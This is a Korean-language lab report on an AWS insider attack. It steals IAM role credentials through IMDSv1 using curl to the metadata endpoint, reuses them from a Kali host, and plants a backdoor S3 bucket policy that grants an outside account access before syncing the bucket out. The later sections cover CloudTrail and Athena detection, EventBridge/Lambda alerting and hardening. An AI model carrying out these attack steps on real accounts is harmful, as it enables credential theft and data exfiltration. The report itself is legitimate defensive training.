@@ -1,0 +1,663 @@
+<html>
+<body>
+<!--StartFragment--><html><head></head><body><h1>AWS 내부 공격 시나리오 -<br> Backdoor an S3 Bucket via Bucket Policy 실습 보고서</h1>
+
+</html># AWS 내부 공격 시나리오 실습 보고서
+
+## 목차
+1. [[실습 개요]](#실습-개요)
+2. [[인프라 구성]](#인프라-구성)
+3. [[공격 시나리오 1: IAM Role 자격 증명 탈취]](#공격-시나리오-1-iam-role-자격-증명-탈취)
+4. [[공격 시나리오 2: S3 백도어 설정을 통한 데이터 유출]](#공격-시나리오-2-s3-백도어-설정을-통한-데이터-유출)
+5. [[로그 분석 및 탐지]](#로그-분석-및-탐지)
+6. [[대응 전략]](#대응-전략)
+7. [[보안 권장사항]](#보안-권장사항)
+8. [[결론]](#결론)
+
+---
+
+## 실습 개요
+
+### 실습 목적
+AWS 환경에서 IAM권한을 획득한 내부 사용자가 s3:PutBucketPolicy 권한을 악용하여, 외부 공격자의 AWS 계정에 접근 권한을 부여함으로써 S3 버킷에서 데이터를 유출하는 정책 기반 백도어 공격을 시뮬레이션한다.
+
+### 실습 범위
+- EC2 인스턴스를 통한 내부망 침투
+- Instance Metadata Service(IMDS)를 활용한 IAM 자격 증명 탈취
+- S3 버킷 정책 조작을 통한 백도어 설정
+- CloudTrail 로그 분석을 통한 공격 탐지
+
+### 사전 지식
+- **IMDS란?**
+IMDS (Instance Metadata Service) 는 AWS EC2 인스턴스 내부에서 자신의 정보(IAM Role, IP, 인스턴스 ID 등) 를
+HTTP를 통해 확인할 수 있도록 제공하는 메타데이터 API입니다.
+기본 요청 주소: " http://169.254.169.254/latest/meta-data/ "주로 EC2 내부에서 IAM Role 자격 증명을 자동으로 가져올 때 사용하며
+AWS SDK나 CLI에서 자동으로 이 경로를 참조함
+- **실습 배경**  
+이 실습은 IMDSv1을 허용한 EC2 환경에서,  
+공격자가 EC2 메타데이터 서비스에 접근하여 IAM Role 자격 증명을 탈취하는 시나리오를 다룸
+---
+
+## 인프라 구성
+
+### 전체 아키텍처
+```
+Internet Gateway
+       |
+   Public Subnet (10.0.1.0/24)
+   ├── Kali Linux (공격자)
+   └── Bastion Host (중계용)
+       |
+   NAT Gateway
+       |
+   Private Subnet (10.0.2.0/24)
+   └── Target EC2 (Ubuntu, 피해자)
+```
+
+### 구성 요소
+
+| 구분 | 리소스 | 역할 | 위치 |
+|------|--------|------|------|
+| **네트워크** | VPC | 격리된 네트워크 환경 | ap-northeast-2 |
+|  | Public Subnet | 외부 접근 가능 영역 | 10.0.1.0/24 |
+|  | Private Subnet | 내부 보호 영역 | 10.0.2.0/24 |
+| **컴퓨팅** | Kali Linux | 공격자 머신 | Public Subnet |
+|  | Bastion Host | SSH 중계 서버 | Public Subnet |
+|  | Target EC2 | 공격 대상 서버 | Private Subnet |
+| **보안/로깅** | CloudTrail | API 호출 로그 기록 | 전역 |
+|  | GuardDuty | 이상 행위 탐지 | 전역 |
+|  | S3 Bucket | CloudTrail 로그 저장소 | ap-northeast-2 |
+
+### 배포 방법
+- **Terraform**을 통한 Infrastructure as Code 구현
+- 모든 리소스의 버전 관리 및 자동화된 배포 지원
+
+---
+
+## 공격 시나리오 1: IAM Role 자격 증명 탈취
+
+### 공격 흐름 개요
+```
+Kali Linux → Bastion Host (SSH) → Target EC2 (Pivoting) → IMDS 접근 → 자격증명 탈취 → 외부 악용
+```
+
+### 단계별 공격 수행
+
+#### 단계 1: Bastion Host 초기 접속
+```bash
+# Kali Linux에서 Bastion Host로 SSH 접속
+ssh -i ~/.ssh/ec2-default-key.pem ubuntu@<BASTION_PUBLIC_IP>
+```
+
+**공격 포인트:**
+- 공격자는 퍼블릭 서브넷의 Kali 인스턴스에서 공격 시작
+- Bastion Host가 내부망 접근을 위한 유일한 진입점
+- SSH 키 기반 인증을 통한 접근
+
+#### 단계 2: SSH Pivoting을 통한 내부망 침투
+```bash
+# Bastion Host에서 Private Subnet의 Target EC2로 접속
+ssh -i ~/.ssh/ec2-default-key.pem ubuntu@<TARGET_PRIVATE_IP>
+
+# SSH 키 권한 설정 (필요시)
+chmod 400 ~/.ssh/ec2-default-key.pem
+```
+
+**기술적 세부사항:**
+- 내부망 통신 (10.0.2.0/24)을 통한 타겟 서버 접근
+- 동일한 SSH 키를 사용한 횡적 이동(Lateral Movement)
+
+#### 단계 3: Instance Metadata Service(IMDS) 악용
+
+**IMDS 개념:**
+Instance Metadata Service는 EC2 인스턴스 내부에서 메타데이터에 접근할 수 있는 HTTP 기반 서비스입니다.
+- 기본 엔드포인트: `http://169.254.169.254/latest/meta-data/`
+- AWS SDK 및 CLI에서 자동으로 참조
+- IAM Role 자격 증명을 임시로 제공
+
+**자격 증명 탈취 과정:**
+```bash
+# IAM Role 이름 확인
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# 실제 자격 증명 획득
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
+```
+
+**응답 데이터 구조:**
+```json
+{
+  "AccessKeyId": "ASIA...",
+  "SecretAccessKey": "...",
+  "Token": "IQoJb3JpZ2luX2Vj...",
+  "Expiration": "2025-04-02T12:00:00Z"
+}
+```
+
+#### 단계 4: 외부 환경에서 자격 증명 설정
+```bash
+# Kali Linux에서 AWS CLI 프로필 구성
+vim ~/.aws/credentials
+```
+
+```ini
+[stolen-creds]
+aws_access_key_id = <AccessKeyId>
+aws_secret_access_key = <SecretAccessKey>
+aws_session_token = <Token>
+region = ap-northeast-2
+```
+
+#### 단계 5: 권한 남용 및 정보 수집
+```bash
+# S3 버킷 목록 조회
+aws s3 ls --profile stolen-creds
+
+# 기타 가능한 정보 수집 명령
+aws sts get-caller-identity --profile stolen-creds
+aws iam list-attached-role-policies --role-name target-ec2-role --profile stolen-creds
+```
+
+### Target EC2 IAM Role 권한 구성
+실습 환경에서 Target EC2에 부여된 최소 권한:
+```json
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Action": [
+        "s3:ListAllMyBuckets",
+        "s3:ListBucket"
+      ],
+      "Resource": "*"
+    }
+  ]
+}
+```
+
+---
+
+## 공격 시나리오 2: S3 백도어 설정을 통한 데이터 유출
+
+### 공격 개요
+권한을 획득한 내부 사용자가 `s3:PutBucketPolicy` 권한을 악용하여 외부 공격자의 AWS 계정에 접근 권한을 부여하고, S3 버킷에서 데이터를 유출하는 정책 기반 백도어 공격을 시뮬레이션합니다.
+
+### 공격 환경 설정
+
+| 구분 | 설명 |
+|------|------|
+| **내부 공격자** | EC2 인스턴스에서 IAM Role 자격 탈취, AWS CLI 사용 가능 |
+| **외부 공격자** | 별도의 AWS 계정 보유 (Account ID: 123456789012) |
+| **대상 리소스** | S3 버킷 `confidential-research-data` (민감 정보 저장) |
+
+### 단계별 공격 수행
+
+#### 단계 1: 사전 탈취한 자격 증명 활용
+```bash
+# 이전 시나리오에서 획득한 자격 증명 사용
+aws configure --profile backdoor-creds
+```
+
+#### 단계 2: 대상 S3 버킷 정보 수집
+```bash
+# 접근 가능한 S3 버킷 목록 확인
+aws s3 ls --profile backdoor-creds
+
+# 특정 버킷 내 민감 데이터 확인
+aws s3 ls s3://confidential-research-data --profile backdoor-creds --recursive
+```
+
+**발견 가능한 민감 파일:**
+- `employee_records.csv` - 직원 개인정보
+- `keys.json` - API 키 및 비밀번호
+- `financials/quarterly_report.xlsx` - 재무 정보
+
+#### 단계 3: 백도어 버킷 정책 작성
+`backdoor-policy.json` 파일 생성:
+```json
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Sid": "BackdoorReadAccess",
+      "Effect": "Allow",
+      "Principal": {
+        "AWS": "arn:aws:iam::123456789012:root"
+      },
+      "Action": [
+        "s3:GetObject",
+        "s3:ListBucket"
+      ],
+      "Resource": [
+        "arn:aws:s3:::confidential-research-data",
+        "arn:aws:s3:::confidential-research-data/*"
+      ]
+    }
+  ]
+}
+```
+
+#### 단계 4: 백도어 정책 적용
+```bash
+# S3 버킷에 백도어 정책 적용
+aws s3api put-bucket-policy \
+  --bucket confidential-research-data \
+  --policy file://backdoor-policy.json \
+  --profile backdoor-creds
+```
+
+성공 시, 외부 AWS 계정(123456789012)이 해당 버킷에 완전 접근 가능해집니다.
+
+#### 단계 5: 외부 계정을 통한 데이터 유출
+```bash
+# 외부 공격자 계정에서 실행
+# 단일 파일 다운로드
+aws s3 cp s3://confidential-research-data/employee_records.csv ./stolen/
+
+# 전체 버킷 데이터 동기화
+aws s3 sync s3://confidential-research-data ./stolen-data/ --delete
+
+# 압축 후 외부로 전송
+tar -czf company_data.tar.gz ./stolen-data/
+```
+
+**공격 결과:** 조직의 모든 민감 데이터가 외부 계정으로 완전 유출됨
+
+---
+
+## 로그 분석 및 탐지
+
+### CloudTrail 로그 분석
+
+#### 주요 탐지 이벤트
+
+**비정상적인 API 호출 패턴**
+```json
+{
+  "eventTime": "2025-05-27T10:30:00Z",
+  "eventName": "ListBuckets", 
+  "userAgent": "aws-cli/2.13.0 Python/3.11.3 Linux/5.15.0-kali3-amd64",
+  "sourceIPAddress": "3.34.123.45",
+  "userIdentity": {
+    "type": "AssumedRole",
+    "arn": "arn:aws:sts::111122223333:assumed-role/target-ec2-role/i-0123456789abcdef0"
+  }
+}
+```
+
+**탐지 포인트:**
+- EC2 Role이지만 외부 IP에서 API 호출
+- Kali Linux User-Agent 포함  
+- 평상시와 다른 시간대 활동
+
+**S3 버킷 정책 변경 이벤트**
+```json
+{
+  "eventTime": "2025-05-27T11:15:00Z",
+  "eventName": "PutBucketPolicy",
+  "requestParameters": {
+    "bucketName": "confidential-research-data"
+  },
+  "userIdentity": {
+    "type": "AssumedRole", 
+    "arn": "arn:aws:sts::111122223333:assumed-role/target-ec2-role/i-0123456789abcdef0"
+  }
+}
+```
+
+#### Amazon Athena 분석 쿼리
+
+**외부 IP에서의 EC2 Role 사용 탐지**
+```sql
+SELECT 
+    eventtime,
+    eventname, 
+    sourceipaddress,
+    useragent,
+    useridentity.arn
+FROM cloudtrail_logs 
+WHERE useridentity.type = 'AssumedRole'
+  AND useridentity.arn LIKE '%target-ec2-role%'
+  AND sourceipaddress NOT LIKE '10.%'
+  AND eventtime > current_date - interval '7' day
+ORDER BY eventtime DESC;
+```
+
+**S3 버킷 정책 변경 추적**
+```sql
+SELECT 
+    eventtime,
+    requestparameters.bucketname,
+    sourceipaddress,
+    useridentity.arn as suspicious_user
+FROM cloudtrail_logs
+WHERE eventname = 'PutBucketPolicy'
+  AND eventtime > current_date - interval '1' day
+ORDER BY eventtime DESC;
+```
+
+---
+
+## 대응 전략
+
+### 실시간 탐지 및 자동 대응 시스템
+
+#### 아키텍처 개요
+```
+CloudTrail → EventBridge → Lambda → SNS → Email Alert
+     ↓              ↓
+ S3 Logs      자동 대응 실행
+```
+
+### Terraform을 통한 자동 대응 시스템 구성
+
+#### SNS 알림 시스템 설정
+```hcl
+# SNS Topic 생성
+resource "aws_sns_topic" "security_alert" {
+  name = "security-alerts-topic"
+}
+
+# SNS 이메일 구독자 등록
+resource "aws_sns_topic_subscription" "email_alert" {
+  topic_arn = aws_sns_topic.security_alert.arn
+  protocol  = "email"
+  endpoint  = "security-team@company.com"
+}
+```
+
+#### Lambda 실행 권한 설정
+```hcl
+# IAM 역할 (Lambda 실행용)
+resource "aws_iam_role" "lambda_alert_role" {
+  name = "lambda_s3_alert_role"
+  
+  assume_role_policy = jsonencode({
+    Version = "2012-10-17",
+    Statement = [{
+      Effect = "Allow",
+      Principal = { Service = "lambda.amazonaws.com" },
+      Action = "sts:AssumeRole"
+    }]
+  })
+}
+
+# SNS Publish 권한
+resource "aws_iam_policy" "lambda_alert_sns_policy" {
+  name = "lambda_s3_alert_sns_policy"
+  
+  policy = jsonencode({
+    Version = "2012-10-17",
+    Statement = [{
+      Effect   = "Allow",
+      Action   = ["sns:Publish"],
+      Resource = aws_sns_topic.security_alert.arn
+    }]
+  })
+}
+
+# 정책 연결
+resource "aws_iam_role_policy_attachment" "lambda_alert_attach" {
+  role       = aws_iam_role.lambda_alert_role.name
+  policy_arn = aws_iam_policy.lambda_alert_sns_policy.arn
+}
+```
+
+#### Lambda 함수 배포
+```hcl
+# Lambda S3 백도어 탐지 함수
+resource "aws_lambda_function" "s3_backdoor_alert_lambda" {
+  function_name = "s3-backdoor-alert"
+  handler       = "lambda_s3_alert.lambda_handler"
+  runtime       = "python3.9"
+  role          = aws_iam_role.lambda_alert_role.arn
+  
+  filename         = "${path.module}/lambda_s3_alert.zip"
+  source_code_hash = filebase64sha256("${path.module}/lambda_s3_alert.zip")
+  
+  environment {
+    variables = {
+      SNS_TOPIC_ARN = aws_sns_topic.security_alert.arn
+    }
+  }
+}
+```
+
+#### EventBridge 규칙 설정
+```hcl
+# PutBucketPolicy 이벤트 탐지 규칙
+resource "aws_cloudwatch_event_rule" "s3_backdoor_event_rule" {
+  name = "detect-putbucketpolicy-s3-backdoor"
+  
+  event_pattern = jsonencode({
+    "source": ["aws.s3"],
+    "detail-type": ["AWS API Call via CloudTrail"],
+    "detail": {
+      "eventName": ["PutBucketPolicy"]
+    }
+  })
+}
+
+# Lambda 실행 권한
+resource "aws_lambda_permission" "s3_backdoor_lambda_permission" {
+  statement_id  = "AllowEventBridgeInvokeS3Backdoor"
+  action        = "lambda:InvokeFunction"
+  function_name = aws_lambda_function.s3_backdoor_alert_lambda.function_name
+  principal     = "events.amazonaws.com"
+  source_arn    = aws_cloudwatch_event_rule.s3_backdoor_event_rule.arn
+}
+
+# EventBridge → Lambda 연결
+resource "aws_cloudwatch_event_target" "s3_backdoor_lambda_target" {
+  rule = aws_cloudwatch_event_rule.s3_backdoor_event_rule.name
+  arn  = aws_lambda_function.s3_backdoor_alert_lambda.arn
+}
+```
+
+### Lambda 함수 예시 코드
+```python
+import json
+import boto3
+import os
+
+def lambda_handler(event, context):
+    sns = boto3.client('sns')
+    
+    # CloudTrail 이벤트 정보 추출
+    detail = event['detail']
+    event_name = detail['eventName']
+    source_ip = detail['sourceIPAddress']
+    user_identity = detail['userIdentity']
+    bucket_name = detail['requestParameters']['bucketName']
+    
+    # 알림 메시지 구성
+    message = f"""
+    보안 경고: S3 백도어 탐지됨
+    
+    이벤트: {event_name}
+    버킷: {bucket_name}
+    소스 IP: {source_ip}
+    사용자: {user_identity.get('arn', 'Unknown')}
+    시간: {detail['eventTime']}
+    
+    즉시 확인이 필요합니다.
+    """
+    
+    # SNS 알림 전송
+    sns.publish(
+        TopicArn=os.environ['SNS_TOPIC_ARN'],
+        Subject='S3 백도어 탐지 알림',
+        Message=message
+    )
+    
+    return {
+        'statusCode': 200,
+        'body': json.dumps('Alert sent successfully')
+    }
+```
+---
+## 예방적 보안 조치
+
+#### IAM 정책 강화
+
+**조건부 S3 버킷 정책 변경 권한**
+```json
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Action": "s3:PutBucketPolicy",
+      "Resource": "*",
+      "Condition": {
+        "StringEquals": {
+          "aws:RequestedRegion": "ap-northeast-2",
+          "aws:PrincipalTag/Department": "Security"
+        },
+        "IpAddress": {
+          "aws:SourceIp": ["10.0.0.0/8", "192.168.0.0/16"]
+        }
+      }
+    }
+  ]
+}
+```
+
+**리소스 태그 기반 접근 제어**
+```json
+{
+  "Version": "2012-10-17", 
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Action": "s3:PutBucketPolicy",
+      "Resource": "*",
+      "Condition": {
+        "StringEquals": {
+          "s3:ExistingBucketTag/PolicyUpdateAllowed": "true"
+        }
+      }
+    }
+  ]
+}
+```
+
+#### EC2 인스턴스 보안 강화
+
+**IMDSv2 강제 적용 (Terraform)**
+```hcl
+resource "aws_instance" "target" {
+  # 기본 설정...
+  
+  metadata_options {
+    http_endpoint               = "enabled"
+    http_tokens                = "required"  # IMDSv2 강제
+    http_put_response_hop_limit = 1
+    instance_metadata_tags     = "enabled"
+  }
+}
+```
+
+---
+
+## 보안 권장사항
+
+### 운영 환경 보안 체크리스트
+
+| 분야 | 실습 환경 | 운영 환경 권장 | 우선순위 |
+|------|-----------|---------------|----------|
+| **인증** | SSH 키 기반 | Certificate Authority + MFA | 🔴 High |
+| **IMDS** | IMDSv1 허용 | IMDSv2 강제 (`http_tokens=required`) | 🔴 High |
+| **네트워크** | 단순 SSH 접근 | Session Manager + VPN | 🟡 Medium |
+| **권한** | 데모용 S3 권한 | 최소 권한 원칙 적용 | 🔴 High |
+| **모니터링** | 기본 CloudTrail | 실시간 알림 + 자동 대응 | 🟡 Medium |
+
+### 핵심 보안 강화 방안
+
+#### 인증 및 접근 제어
+```bash
+# Session Manager를 통한 안전한 EC2 접근
+aws ssm start-session --target i-1234567890abcdef0
+
+# MFA 강제 정책 적용
+aws iam put-user-policy --user-name admin --policy-name MFARequired --policy-document file://mfa-policy.json
+```
+
+#### 네트워크 보안
+```hcl
+# VPC Flow Logs 활성화
+resource "aws_flow_log" "vpc_flow_log" {
+  iam_role_arn    = aws_iam_role.flow_log.arn
+  log_destination = aws_cloudwatch_log_group.vpc_log_group.arn
+  traffic_type    = "ALL"
+  vpc_id          = aws_vpc.main.id
+}
+
+# 엄격한 Security Group 설정
+resource "aws_security_group" "strict_sg" {
+  name = "strict-access-sg"
+  
+  # SSH는 특정 IP에서만 허용
+  ingress {
+    from_port   = 22
+    to_port     = 22
+    protocol    = "tcp"
+    cidr_blocks = ["10.0.0.0/8"]  # 내부 네트워크만
+  }
+  
+  # 모든 아웃바운드 차단 (필요시에만 허용)
+  egress {
+    from_port   = 443
+    to_port     = 443
+    protocol    = "tcp"
+    cidr_blocks = ["0.0.0.0/0"]
+  }
+}
+```
+
+#### 데이터 보호
+```hcl
+# S3 버킷 보안 강화
+resource "aws_s3_bucket" "secure_bucket" {
+  bucket = "company-secure-data"
+}
+
+# 퍼블릭 액세스 완전 차단
+resource "aws_s3_bucket_public_access_block" "secure_bucket_pab" {
+  bucket = aws_s3_bucket.secure_bucket.id
+  
+  block_public_acls       = true
+  block_public_policy     = true
+  ignore_public_acls      = true
+  restrict_public_buckets = true
+}
+
+# 기본 암호화 설정
+resource "aws_s3_bucket_server_side_encryption_configuration" "secure_bucket_encryption" {
+  bucket = aws_s3_bucket.secure_bucket.id
+  
+  rule {
+    apply_server_side_encryption_by_default {
+      sse_algorithm = "AES256"
+    }
+  }
+}
+```
+
+### 지속적 모니터링 체계
+
+#### 필수 모니터링 이벤트
+- `AssumeRole` - 역할 사용 패턴 분석
+- `PutBucketPolicy` - S3 정책 변경 탐지  
+- `CreateUser` - 신규 사용자 생성 알림
+- `AttachUserPolicy` - 권한 변경 추적
+- `ConsoleLogin` - 콘솔 로그인 모니터링
+
+---
+
+## 결론
+
+본 실습을 통해 AWS 환경에서 발생할 수 있는 내부 공격 시나리오와 이에 대한 탐지 및 대응 방안을 확인했습니다. 특히 IMDS를 통한 자격 증명 탈취와 S3 버킷 정책 조작이라는 두 가지 주요 공격 벡터에 대해 실제 공격 과정을 재현하고, CloudTrail 로그 분석을 통한 탐지 방법을 검증했습니다.
+
+실제 운영 환경에서는 본 보고서에서 제시한 보안 권장사항을 반드시 적용하여 유사한 공격을 사전에 방지하고, 만약 공격이 발생하더라도 신속한 탐지와 대응이 가능하도록 보안 체계를 구축해야 합니다.
